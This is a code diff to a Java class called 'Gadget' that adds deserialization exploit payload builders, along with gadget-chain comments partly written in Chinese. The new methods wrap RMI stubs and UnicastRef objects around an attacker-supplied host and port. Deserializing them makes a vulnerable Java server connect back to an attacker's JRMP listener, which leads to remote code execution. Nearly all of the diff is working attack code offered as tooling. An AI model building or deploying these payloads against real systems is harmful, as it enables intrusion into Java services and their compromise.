@@ -21,6 +21,8 @@ import sun.security.pkcs.PKCS9Attributes;
 import sun.swing.SwingLazyValue;
 
 import javax.management.BadAttributeValueExpException;
+import javax.management.remote.rmi.RMIConnectionImpl_Stub;
+import javax.management.remote.rmi.RMIServerImpl_Stub;
 import javax.naming.CompositeName;
 import javax.swing.*;
 import javax.swing.event.EventListenerList;
@@ -146,6 +148,9 @@ public class Gadget {
     /*
 
     //TODO
+
+    PKCS9Attributes not Serializable
+
     PKCS9Attributes#toString
         UIDefaults#get
             SwingLazyValue#createValue
@@ -167,11 +172,61 @@ public class Gadget {
         return new HotSwappableTargetSource(obj);
     }
 
+    /*
+    RemoteObjectInvocationHandler#super.readObject
+        RemoteObject#readObject
+            UnicastRef#readExternal
+                LiveRef#read
+                    ...
+                    JRMP
+     */
     public static RemoteObjectInvocationHandler getJRMPPayloadJDK8u231(String host, int port) throws  Exception{
         ObjID id = new ObjID(1); // RMI registry
         TCPEndpoint te = new TCPEndpoint(host, port);
         UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
         return new RemoteObjectInvocationHandler(ref);
+    }
+
+    /*
+    RMIConnectionImpl_Stub#super.readObject
+        RemoteObject#readObject
+            UnicastRef#readExternal
+                LiveRef#read
+                    ...
+                    JRMP
+    */
+    public static RMIConnectionImpl_Stub getJRMPPayloadJDK8u231RMIConnectionImpl_Stub(String host, int port) throws  Exception{
+        ObjID id = new ObjID(1); // RMI registry
+        TCPEndpoint te = new TCPEndpoint(host, port);
+        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
+        return new RMIConnectionImpl_Stub(ref);
+    }
+
+    /*
+    RMIServerImpl_Stub#super.readObject
+        RemoteObject#readObject
+            UnicastRef#readExternal
+                LiveRef#read
+                    ...
+                    JRMP
+    */
+    public static RMIServerImpl_Stub getJRMPPayloadJDK8u231RMIServerImpl_Stub(String host, int port) throws  Exception{
+        ObjID id = new ObjID(1); // RMI registry
+        TCPEndpoint te = new TCPEndpoint(host, port);
+        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
+        return new RMIServerImpl_Stub(ref);
+    }
+
+    /*
+    反序列化时会触发readExternal
+    UnicastRef#readExternal
+        LiveRef#read
+            ...
+            JRMP
+     */
+    public static UnicastRef getJRMPPayloadJDK8uxxx(String host, int port) throws  Exception{
+        LiveRef liveRef = new LiveRef(new ObjID(1), new TCPEndpoint(host,port), false);
+        return new UnicastRef(liveRef);
     }
 
     public static UnicastRemoteObject getJRMPPayloadJDK8u241(String host, int port) throws  Exception{
